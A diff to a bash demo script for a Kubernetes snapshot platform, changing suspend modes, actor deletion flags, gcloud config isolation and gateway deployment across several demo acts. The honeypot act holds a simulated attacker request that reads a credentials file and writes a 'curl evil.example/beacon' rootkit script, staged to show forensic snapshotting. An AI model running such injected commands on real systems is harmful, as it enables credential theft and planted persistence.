@@ -88,13 +88,23 @@ apply_env_defaults() {
     export SUBSTRATE_ROOT="${SUBSTRATE_ROOT:-$(cd "${REPO_ROOT}/.." && pwd)}"
   fi
 
-  # Isolate KUBECONFIG so concurrent kubectl sessions on the same machine cannot
-  # switch current-context away from the target GKE cluster mid-demo.
+  # Isolate KUBECONFIG and CLOUDSDK_CONFIG so concurrent sessions on the same
+  # machine cannot switch current-context or race on gcloud SQLite/log files.
   local src_kubeconfig="${KUBECONFIG:-${HOME}/.kube/config}"
   local isolated_kubeconfig="/tmp/kubeconfig-${CLUSTER_NAME}"
   if [[ -f "${src_kubeconfig}" && "${src_kubeconfig}" != "${isolated_kubeconfig}" ]]; then
     cp "${src_kubeconfig}" "${isolated_kubeconfig}"
     export KUBECONFIG="${isolated_kubeconfig}"
+  fi
+  local src_gcloud="${CLOUDSDK_CONFIG:-${HOME}/.config/gcloud}"
+  local isolated_gcloud="/tmp/gcloud-${CLUSTER_NAME}"
+  if [[ -d "${src_gcloud}" && "${src_gcloud}" != "${isolated_gcloud}" ]]; then
+    if [[ ! -d "${isolated_gcloud}" ]]; then
+      cp -r "${src_gcloud}" "${isolated_gcloud}" 2>/dev/null || true
+    fi
+    if [[ -d "${isolated_gcloud}" ]]; then
+      export CLOUDSDK_CONFIG="${isolated_gcloud}"
+    fi
   fi
   local target_ctx="${KUBE_CONTEXT:-gke_${PROJECT_ID}_${CLUSTER_LOCATION}_${CLUSTER_NAME}}"
   kubectl config use-context "${target_ctx}" >/dev/null 2>&1 || true
@@ -193,9 +203,16 @@ bootstrap_gke() {
 
     go install ./cmd/kubectl-ate
 
-    ./hack/install-ate.sh \
-      --deploy-ate-system \
-      --credential-provider="${ATE_CREDENTIAL_PROVIDER}"
+    local allowed_spiffe="spiffe://cluster.local/ns/anything-but-agents/sa/default,spiffe://cluster.local/ns/anything-but-agents/sa/dungeon2d-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/coldstart-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/tenantdb-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/honeypot-gateway,spiffe://cluster.local/ns/anything-but-agents/sa/timewarp-gateway"
+
+    go run ./cmd/ate-setup deploy ate-system \
+      --snapshot-location="gs://${BUCKET_NAME}/" \
+      --snapshot-transfer-gsa-name="ate-snapshot-transfer" \
+      --gcp-project-id="${PROJECT_ID}" \
+      --credential-provider="${ATE_CREDENTIAL_PROVIDER}" \
+      --ingress-allowed-spiffe-ids="${allowed_spiffe}"
+
+    go run ./cmd/ate-setup publish worker-images
   )
 
   deploy_all
@@ -213,12 +230,20 @@ detect_cluster_defaults() {
     SUBSTRATE_VERSION="$(kubectl get nodes -o jsonpath='{.items[0].metadata.labels.ate\.dev/substrate-version}' 2>/dev/null || true)"
   fi
   if [[ -z "${ATEOM_GVISOR_IMAGE:-}" ]]; then
-    # Discover an existing ateom-gvisor image from the cluster if one is already deployed,
-    # or build it from SUBSTRATE_ROOT via ko.
+    # Discover an existing gvisor worker image from the cluster if one is already deployed,
+    # or build it from SUBSTRATE_ROOT.
     ATEOM_GVISOR_IMAGE="$(kubectl get workerpools -A -o jsonpath='{.items[0].spec.workerImage}' 2>/dev/null || true)"
-    if [[ -z "${ATEOM_GVISOR_IMAGE}" && -n "${SUBSTRATE_ROOT:-}" && -d "${SUBSTRATE_ROOT}/cmd/ateom-gvisor" ]]; then
-      echo "Building ateom-gvisor worker image via ko..."
-      ATEOM_GVISOR_IMAGE="$(cd "${SUBSTRATE_ROOT}" && ko build ./cmd/ateom-gvisor)"
+    if [[ "${ATEOM_GVISOR_IMAGE}" == *"/ateom-gvisor"* && -d "${SUBSTRATE_ROOT:-}/cmd/ateworker-gvisor" ]]; then
+      ATEOM_GVISOR_IMAGE=""
+    fi
+    if [[ -z "${ATEOM_GVISOR_IMAGE}" && -n "${SUBSTRATE_ROOT:-}" ]]; then
+      if [[ -d "${SUBSTRATE_ROOT}/cmd/ateworker-gvisor" ]]; then
+        echo "Building ateworker-gvisor worker image via ko..."
+        ATEOM_GVISOR_IMAGE="$(cd "${SUBSTRATE_ROOT}" && ko build ./cmd/ateworker-gvisor)"
+      elif [[ -d "${SUBSTRATE_ROOT}/cmd/ateom-gvisor" ]]; then
+        echo "Building ateom-gvisor worker image via ko..."
+        ATEOM_GVISOR_IMAGE="$(cd "${SUBSTRATE_ROOT}" && ko build ./cmd/ateom-gvisor)"
+      fi
     fi
   fi
   export DEMO_DOMAIN="${DEMO_DOMAIN:-substrate.learngke.dev}"
@@ -297,7 +322,7 @@ deploy_all() {
   kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
 
   for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3 db-acme db-globex db-initech db-umbrella honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
-    kubectl ate delete actor "${actor}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${actor}" -a "${ATESPACE}" 2>/dev/null || true
   done
   kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true
 
@@ -320,8 +345,18 @@ deploy_all() {
 
 ensure_router_port_forward() {
   if ! curl -s -o /dev/null --connect-timeout 1 "${ROUTER_URL}/" 2>/dev/null; then
-    echo "Starting background port-forward to svc/atenet-router on ${ROUTER_URL}..."
-    kubectl port-forward -n ate-system svc/atenet-router 8000:80 >/dev/null 2>&1 &
+    local router_http_port
+    router_http_port="$(kubectl get svc atenet-router -n ate-system -o jsonpath='{.spec.ports[?(@.port==80)].port}' 2>/dev/null || true)"
+    if [[ "${router_http_port}" == "80" ]]; then
+      echo "Starting background port-forward to svc/atenet-router on ${ROUTER_URL}..."
+      kubectl port-forward -n ate-system svc/atenet-router 8000:80 >/dev/null 2>&1 &
+    else
+      if ! kubectl get deployment dungeon2d-gateway -n anything-but-agents >/dev/null 2>&1; then
+        deploy_dungeon2d_gateway
+      fi
+      echo "Starting background mTLS bridge port-forward via deploy/dungeon2d-gateway on ${ROUTER_URL}..."
+      kubectl port-forward -n anything-but-agents deploy/dungeon2d-gateway 8000:8000 >/dev/null 2>&1 &
+    fi
     PORT_FORWARD_PID=$!
     trap 'kill "${PORT_FORWARD_PID:-}" "${GATEWAY_PID:-}" 2>/dev/null || true' EXIT
     for _ in {1..20}; do
@@ -355,7 +390,7 @@ reset_act_resources() {
         kubectl ate delete tag "${tag_name}" -a "${ATESPACE}" >/dev/null 2>&1 || true
         ;;
       *)
-        kubectl ate delete actor "${resource}" -a "${ATESPACE}" --any-state >/dev/null 2>&1 || true
+        kubectl ate delete actor "${resource}" -a "${ATESPACE}" >/dev/null 2>&1 || true
         ;;
     esac
   done
@@ -381,7 +416,7 @@ act1_dungeon() {
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/hero-mofi" "${ROUTER_URL}/?cmd=move+dragon-lair"
 
   step "5. QUICKSAVE! Suspend the actor to GCS (persisting Go heap variables) and tag the snapshot 'before-dragon'"
-  run_cmd kubectl ate suspend actor hero-mofi -a "${ATESPACE}"
+  run_cmd kubectl ate suspend actor hero-mofi -a "${ATESPACE}" --mode=sync
   run_cmd kubectl ate create tag before-dragon -a "${ATESPACE}" --actor hero-mofi
 
   step "6. Recklessly attack the Heap Dragon without the fire-shield -> YOU DIE (PlayerHP = 0 in RAM)"
@@ -523,7 +558,7 @@ deploy_dungeon2d_gateway() {
 cleanup_dungeon2d_gateway() {
   banner "Cleaning up Dungeon 2D Gateway Deployment & Actors"
   for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^d2d-/ {print $2}' || true); do
-    kubectl ate delete actor "${act}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
   done
   for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-d2d-/ {print $2}' || true); do
     kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
@@ -551,7 +586,7 @@ deploy_coldstart_hpa() {
   ensure_template_ready coldstart
 
   for i in 1 2 3; do
-    kubectl ate delete actor "coldstart-${i}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
     kubectl ate create actor "coldstart-${i}" -a "${ATESPACE}" --template coldstart
     if [[ "${i}" -gt 1 ]]; then
       kubectl ate suspend actor "coldstart-${i}" -a "${ATESPACE}" 2>/dev/null || true
@@ -604,7 +639,7 @@ deploy_coldstart_hpa() {
 cleanup_coldstart_hpa() {
   banner "Cleaning up Cold-Start HPA Comparison Stack & Actors"
   for act in coldstart-1 coldstart-2 coldstart-3 clone-1 clone-2 clone-3; do
-    kubectl ate delete actor "${act}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
   done
   kubectl delete hpa coldstart-k8s coldstart-substrate -n anything-but-agents --ignore-not-found
   kubectl delete deployment,service coldstart-k8s coldstart-k8s-router coldstart-gateway -n anything-but-agents --ignore-not-found
@@ -789,16 +824,16 @@ act3_tenantdb() {
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?table=settings&key=region&val=us-west3-slc"
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-globex" "${ROUTER_URL}/?table=subscriptions&key=tier&val=freight-scale&amount=32000"
 
-  step "3. PAUSE db-acme (onPause: FULL) -> query it: HOT_RAM_RESUME! Both /data/wal.jsonl AND 16.0 MB RAM Buffer Pool survive intact (0 WAL replayed)"
-  run_cmd kubectl ate pause actor db-acme -a "${ATESPACE}"
+  step "3. PAUSE db-acme (suspend --mode=async) -> query it: HOT_RAM_RESUME! Both /data/wal.jsonl AND 16.0 MB RAM Buffer Pool survive intact (0 WAL replayed)"
+  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}" --mode=async
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/"
 
-  step "4. SUSPEND db-acme (onCommit: DATA) -> query it: COLD_DATA_REPLAY! 16.0 MB RAM heap discarded (99.997% GCS saved); /data/wal.jsonl replayed in <1ms"
-  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}"
+  step "4. SUSPEND db-acme (suspend --mode=sync) -> query it: COLD_DATA_REPLAY! 16.0 MB RAM heap discarded (99.997% GCS saved); /data/wal.jsonl replayed in <1ms"
+  run_cmd kubectl ate suspend actor db-acme -a "${ATESPACE}" --mode=sync
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-acme" "${ROUTER_URL}/?resume_hint=suspend_data"
 
   step "5. GDPR Article 17 Right-to-be-Forgotten: delete tenant 'db-acme' in 1 command, then verify sibling 'db-globex' is 100% intact!"
-  run_cmd kubectl ate delete actor db-acme -a "${ATESPACE}" --any-state
+  run_cmd kubectl ate delete actor db-acme -a "${ATESPACE}"
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/db-globex" "${ROUTER_URL}/"
 
   echo ""
@@ -879,7 +914,7 @@ deploy_tenantdb_gateway() {
 cleanup_tenantdb_gateway() {
   banner "Cleaning up TenantDB Gateway Deployment & Actors"
   for act in db-acme db-globex db-initech db-umbrella; do
-    kubectl ate delete actor "${act}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
   done
   kubectl delete deployment,service,secret,serviceaccount tenantdb-gateway -n anything-but-agents --ignore-not-found
   kubectl delete role,rolebinding tenantdb-gateway-token-minter -n ate-system --ignore-not-found
@@ -922,7 +957,7 @@ act4_honeypot() {
     "${ROUTER_URL}/shell?cmd=id+%26%26+cat+payroll_db_credentials.env.bak+%26%26+echo+'curl+evil.example/beacon'+>+rootkit.sh+%26%26+chmod+%2Bx+rootkit.sh+%26%26+ls+-la"
 
   step "3. Attacker disconnects -> suspend honeypot-203-0-113-5 to GCS (checkpointing rootkit.sh + RAM forensics at \$0 idle compute)"
-  run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}"
+  run_cmd kubectl ate suspend actor honeypot-203-0-113-5 -a "${ATESPACE}" --mode=sync
 
   step "4. Meanwhile, Attacker 198.51.100.9 probes /shell and sees a completely clean Golden Snapshot filesystem"
   run_cmd curl -fsS -H "ate-target-actor: ${ATESPACE}/honeypot-198-51-100-9" "${ROUTER_URL}/shell?cmd=ls+-la"
@@ -998,7 +1033,7 @@ deploy_honeypot_gateway() {
 cleanup_honeypot_gateway() {
   banner "Cleaning up Honeypot Gateway Deployment & Actors"
   for act in $(kubectl ate get actors -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^honeypot-/ {print $2}' || true); do
-    kubectl ate delete actor "${act}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
   done
   for tag in $(kubectl ate get tags -a "${ATESPACE}" 2>/dev/null | awk '$2 ~ /^tag-(honeypot|forensic)/ {print $2}' || true); do
     kubectl ate delete tag "${tag}" -a "${ATESPACE}" 2>/dev/null || true
@@ -1049,7 +1084,7 @@ act5_timewarp() {
   run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-1" "${ROUTER_URL}/lock/acquire?owner=Alice+(checkout-svc)&token=101"
 
   step "2. Suspend Term 1 Leader 'raft-node-1' to GCS for 5 seconds (0 CPU instructions executed; 3s lease expires in the real world!)"
-  run_cmd kubectl ate suspend actor raft-node-1 -a "${ATESPACE}"
+  run_cmd kubectl ate suspend actor raft-node-1 -a "${ATESPACE}" --mode=sync
   echo "Sleeping 5 seconds while raft-node-1 is frozen in GCS — surviving quorum (raft-node-2, raft-node-3) elects raft-node-2 as Term 2 LEADER..."
   sleep 5
   run_cmd curl -fsS -X POST -H "ate-target-actor: ${ATESPACE}/raft-node-2" "${ROUTER_URL}/raft/promote?node_name=raft-node-2&role=LEADER&term=2&leader_id=raft-node-2"
@@ -1158,7 +1193,7 @@ cleanup_gateway_tls() {
 cleanup_timewarp_gateway() {
   banner "Cleaning up Time-Warp Gateway Deployment & Actors"
   for act in raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
-    kubectl ate delete actor "${act}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
   done
   kubectl delete deployment,service,serviceaccount timewarp-gateway -n anything-but-agents --ignore-not-found
   kubectl delete role,rolebinding timewarp-gateway-token-minter -n ate-system --ignore-not-found
@@ -1185,7 +1220,7 @@ cleanup_all() {
   cleanup_timewarp_gateway
   cleanup_gateway_tls
   for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3 db-acme db-globex db-initech db-umbrella honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
-    kubectl ate delete actor "${actor}" -a "${ATESPACE}" --any-state 2>/dev/null || true
+    kubectl ate delete actor "${actor}" -a "${ATESPACE}" 2>/dev/null || true
   done
   kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true
   kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true
